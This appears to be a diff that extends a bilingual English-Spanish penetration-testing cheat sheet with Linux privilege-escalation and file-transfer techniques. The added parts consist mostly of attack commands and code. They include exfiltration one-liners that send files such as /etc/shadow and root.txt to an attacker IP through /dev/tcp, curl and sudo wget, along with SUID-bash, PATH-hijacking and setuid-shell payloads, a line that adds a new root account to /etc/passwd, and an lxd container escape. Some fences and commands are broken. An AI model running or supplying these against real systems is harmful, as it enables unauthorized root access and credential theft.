@@ -312,6 +312,7 @@
 | Sharpersist | https://github.com/mandiant/SharPersist |
 | Sharpup | https://github.com/GhostPack/SharpUp |
 | PowerLurk | https://github.com/Sw4mpf0x/PowerLurk |
+| SUIDump | https://github.com/lypd0/SUIDump |
 
 ### Exploit Databases
 
@@ -557,11 +558,84 @@ CONSOLA attacker
 nc -nv <puerto> -e <shell>
 ```
 
+If no permits of using nc then 
+
+```c
+which authbind
+```
+
+```c
+ls -l /etc/authbind/
+```
+
+```c
+3 folders
+	byaddr
+	byport → Ports with listen permissions
+	byuid
+```
+
+```c
+authbind nc -nlvp 80
+```
+
+```c
+authbind python -m pyftpdlib -p21 -w
+```
+
+Check that it exists an user agent when a get request is send to the victims machine
+
+Curl 
+
+-K parameter defined on the file se 
+
+```c
+url = "http://IP"
+```
+
+```c
+data = @/root/root.txt
+```
+
+```c
+url = "file:///root/root.txt"
+```
+
+```c
+output = /tmp/.0xdf
+```
+
+No python or nc
+
+Victim machine  
+
+```c
+cat FILE > /dev/tcp/IP/PORT
+```
+
+Attacker machine
+
+```c
+nc -nlvp 443 > FILE
+```
+
+Send files to machines
+
+Copy
+
+```c
+base64 -w 0 FILE ; echo
+```
+
+```c
+echo "CONTENT" | base64 -d Z file
+```
+
 TCP SCAN
 
 ```c
 nc -nvv -w 1 -z <ip> <puertos> (puertos en rango x-y)
-```c
+```
 
 UDP SCAN
 
@@ -5482,6 +5556,442 @@ dpkg -l
 uname -a
 ```
 
+###### Methodology
+
+1. Obtain user's information  https://gtfobins.github.io/ sudo -u USER command
+
+```c
+sudo -l 
+```
+2. User groups 
+
+```c
+id
+id -u USERNAME
+```
+check gropus like /dev/fb0  disk
+
+3. Host info
+
+```c
+hostname
+```
+
+4. OS Info
+```c
+cat /etc/os-release
+uname -a
+lsb_release -a
+cd / -list
+``
+
+5. open ports 
+```
+netstat -tulpn | grep LISTEN
+```
+ or 
+
+```c
+ss -nltp
+```
+ Specific port
+
+```c
+lsof -i:PORT
+```
+
+Open ports → path 
+
+```c
+ /proc/net/tcp 
+```
+Convert from hexadecimal
+
+```c
+cat PORTS | tr ':' ' ' | awk '{print $3}' | sort -u
+```
+python3 only add hexadecimal values to get the port number
+
+6. Cron jobs
+
+7. read .bashrc_history
+
+8. 
+```c
+groups users
+```
+
+9. Read
+
+```c
+/etc/passwd
+```
+
+10. Inside container?
+```c
+	cat /proc/1/cgroup
+```
+
+###### Search for files
+
+Search File by name
+
+```c
+ find / -type f -name user.txt 2>/dev/null 
+```
+
+Search location of file
+
+```c
+find . -name THISFILE.txt 
+```
+
+Search line for matching word
+
+```c
+grep -n "test" file.txt 
+```
+
+###### File permissions
+ 
+ 
+```c
+find / -perm -u=s -type f 2>/dev/null
+```
+
+```c
+find / -perm /6000 2>/dev/null
+```
+
+```c
+find / -perm -4000 -ls 2>/dev/null
+```
+ 
+```c
+find \-perm /4000 2>/dev/null
+```
+
+Privileges
+
+```c
+getfacl FILE
+```
+
+GUID Privileges
+
+```c
+find \-perm -2000 2>/dev/null
+```
+
+Search User files
+
+```c
+ find / -user USER 2>/dev/null | grep -vE "proc| run|var|sys|home"
+```
+Search files owned by User
+
+```c
+ find / -user USER -ls 2>/dev/null
+```
+
+Search files owned by group 
+
+```c
+ find / -type f -group GROUP 2>/dev/null
+```
+
+```c
+find / -group GROUP -ls 2>/dev/null
+```
+
+```c
+find / -user USER 2>/dev/null | grep -vE "/proc/|/run/|/sys/"
+```
+
+Search directories with binaries
+
+```c
+find . -executable | rev | cut -d "/" -f 2-200 | rev | sort | uniq 
+```
+
+```c
+strace -f BINARIO 
+```
+syscalls To check binary
+
+Search by capabilities
+
+```c
+getcap -r / 2>/dev/null 
+```
+
+What is running?
+
+```c
+ps -ef
+ps -ef | grep root
+ps aux 
+```
+
+```c
+ps -ef | grep -i PROCESS
+```
+
+Search knock processes
+
+```c
+lsattr FILE
+```
+
+Passwords search
+
+```c
+grep -R -i password | grep -v css
+```
+
+Task monitoring 
+
+```c
+ watch -n 1 ls -l /bin/bash
+```
+
+  in vi, use the command :!/bin/bash to open a shell as root: 
+ 
+  
+ https://github.com/sherlock-project/sherlock 
+ 
+ Crear un servidor http https://gist.github.com/willurd/5720255
+ 
+List groups
+
+```c
+for group in $(groups); do echo "$group"; done
+```c
+ 
+```c
+sudo -u#-1 /bin/bash
+```
+###### SUID Files
+
+Si un script se ejecuta periodicamente con privilegios suid
+If an script gets execute preiodicatly with suid privileges
+
+```c
+#!/bin/bash
+chmod u+s /bin/bash
+```
+
+check bash privileges 
+
+```c
+ls -l /bin/bash
+```
+Create a file of bash with for the SUID
+
+```c
+#!/usr/bin/bash
+bash
+```
+
+Python
+
+```c
+import os
+os.system("chmod u+s /bin/bash")
+```
+
+On a script  
+```c
+__import__("os").system("bash")
+```
+
+Check if the prvilege is changed
+
+```c
+watch -n 1 ls -l /bin/bash
+```
+Exploit
+
+```c
+bash -p 
+```
+
+-p gives the consol propertary ownership
+
+PHP
+
+```c
+<?php
+        system("chmod 4755 /bin/bash");
+?>
+```
+
+https://www.hackingarticles.in/multiple-ways-to-get-root-through-writable-file/
+
+```c
+chmod o+r root
+```
+
+```c
+chown user:user file
+```
+
+With capabilities
+
+```c
+import os
+os.setuid(0)
+os.system("bash")
+```
+
+##### Library hijacking
+
+Observe the $PATH
+Check if there are permits on the folder to insert the file 
+
+```c
+system("4755 /bin/bash")
+```
+
+```c
+system("chmod u+s /bin/bash")
+```
+For a ;ibrary, check the location
+
+```c
+import module_name
+```
+
+```c
+print(module_name.__file__)
+```
+In puthon when executing an action inside an os.system:
+
+```c
+$(whoami)
+```
+
+Check  
+```c
+sudo -l
+```
+
+```c
+sudo -u root COMMAND
+```
+
+Pkexec if SUID
+exploit /opt
+CVE-2021-4034
+
+Check sudo version
+
+Binary to execute shell
+
+```c
+void main() {
+    setuid(0);
+    setgid(0);
+    execl("/bin/sh","sh",0);
+}
+```
+
+```c
+gcc -o setuid setuid.c
+```
+
+Choose a binary to interchange if we can execute a root task
+
+```c
+find / -type f -user root -perm -4000 -ls 2>/dev/null
+```
+
+WGET
+Victim machine
+
+```c
+sudo /usr/bin/wget --post-file=/etc/shadow IP
+```
+
+We obtain the root hash
+
+```c
+sudo /usr/bin/wget -i file
+```
+
+Attacker
+
+```c
+nc -lvp 80 > hash
+```
+
+Also change the /etc/shadow with a know pass
+ 
+GROUPS 
+Check the files that each group has
+
+```c
+for group in $(groups); do echo -e "\n[!} List of files for each group: $group\n";find / \-group $group 2>/dev/null;done
+```
+
+The video group is
+
+```c
+/dev/fb0
+```
+
+```c
+cat /dev/fb0 > Capture
+```
+
+```c
+find \-name virtual_size 2>/dev/null 
+```
+
+./sys/devices/pci0000:00/0000:00:0f.0/graphics/fb0/virtual_size se hace un cat y se obtiene 1176,885 with,lenth
+Abrir gimp la captura e ir a archivo y seleccionar Raw data, poner las proporcioens que aparecian antes
+
+Disk group
+
+```c
+fdisk -l
+```
+
+```c
+debugfs /dev/sda1
+```
+
+Go to desktop 
+
+```c
+/root/.ssh
+```
+ 
+```c
+chmod 600 id_rsa
+```
+
+Check SUID files being modified
+
+```c
+find / -perm -4000 -ls  2>/dev/null| grep -v 201
+```
+
+Files being modified
+
+```c
+stat * | grep Modify | sort -u
+```
+###### Git repo
+
+Check logs and comments
+
+```c
+git log
+git status
+git diff COMIT_NUMBER
+```
+
 ###### IPTables
 
 ```c
@@ -5524,6 +6034,12 @@ Search iptables rules
 openssl passwd <PASSWORD>
 echo "root2:FgKl.eqJO6s2g:0:0:root:/root:/bin/bash" >> /etc/passwd
 su root2
+```
+
+```c
+cp /etc/passwd
+openssl passwd
+root:/PASSSWD:0:0:root:/root
 ```
 
 ##### Apache2
@@ -5834,6 +6350,194 @@ To delete a misconfigured file, put a `./` in front of it.
 
 ```c
 rm ./'--checkpoint-action=exec=python script.sh'
+```
+
+##### Container
+
+If a user is on the lxd group → 110(lxd) 
+
+Ip of container 
+
+```c
+hostname -I
+```
+
+Network of container 
+
+```c
+route -n 
+```
+
+List disc with
+
+```c
+mount | grep home 
+```
+
+```c
+fdisk -l
+```
+
+```c
+df -h
+```c
+
+Check open ports on the container
+
+```c
+base64 -w 0 portScan.sh | xclip -sel clip
+```
+Check on linux 
+```c
+echo PAYLOAD | base64 -d > portSanc.sh
+```
+
+If the user is root on the container
+1. copiarse la bash de la maquina victima donde este montado el contenedor
+2. Volver al contenedor como root
+3. Darle privilegios de root a la bash 
+
+```c
+chown root:root bash
+```
+
+4. Asignarle suid 
+
+```c
+chmod 4755 bash
+```
+##### Path hijacking
+
+Command to hijgack
+
+```c
+cat << EOF > COMMAND
+#!/bin/bash
+cp /bin/bash /tmp/c
+chmod u+s /tmp/c
+EOF
+chmod +x COMMAND
+export PATH=$(pwd):$PATH
+```
+sudo script that usses the command.sh
+
+```c
+./c -p
+```
+Create a file or a revershell
+
+```c
+#!/bin/bash
+chmod u+s /bin/bash
+```
+
+```c
+chmod +x FILE
+```
+##### Cron job
+
+Find cron jobs
+
+```c
+ps -eo command
+```
+
+Running tasks
+
+```c
+set IFS=$'\n'
+```
+
+```c
+for i in $(ps -eo command); do echo $i; done
+```
+ 
+```c
+cat /etc/crontab
+```c
+
+```c
+#!/bin/bash
+
+IFS=$'\n'
+old_process=$(ps -eo command)
+
+while true; do
+        new_process=(ps -eo command)
+        diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]
+        sleep 1
+        old_process=$new_process
+done
+```
+
+```c
+#!/bin/bash
+
+old_process = $(ps -eo command)
+while true; do 
+        new_process=$(ps -eo command)
+        diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v -E "procmon|command"
+        old_process=$new_porcess
+done
+``
+
+Use of pspy
+
+```c
+./pspy
+```
+
+```c
+watch -n 1 ls -l /bin/bash
+```
+
+List timers
+
+```c
+systemctl list-timers
+```
+
+```c
+ps aux | grep 'systemd[ ]--user'
+```
+
+```c
+systemctl --user list-timers
+```
+
+```c
+cat /etc/crontab
+```
+
+Monitor a directory tu obtain the name of a temporal file 
+
+```c
+#!/bin/bash
+
+function ctrl_c(){
+	echo -e "\n\nSaluiendo......"
+	exit 1}
+#Ctr-C
+
+trap ctrl_c INT
+
+while true; do
+	filename= "$(ls -la /var/tmp | grep -oP '\.\w{40}')"
+	if ["$filename" ]; then
+		echo -e "\n[+]El archivo tiene el nombre $filename"
+		exit 0
+	fi
+done
+```
+
+##### Restricted bash
+
+```c
+ssh user@IP -p pass -t "/bin/sh" 
+```
+
+```c
+sshpass -p 'PASS' ssh USER@IP COMMAND
 ```
 
 ##### Writeable Directories in Linux
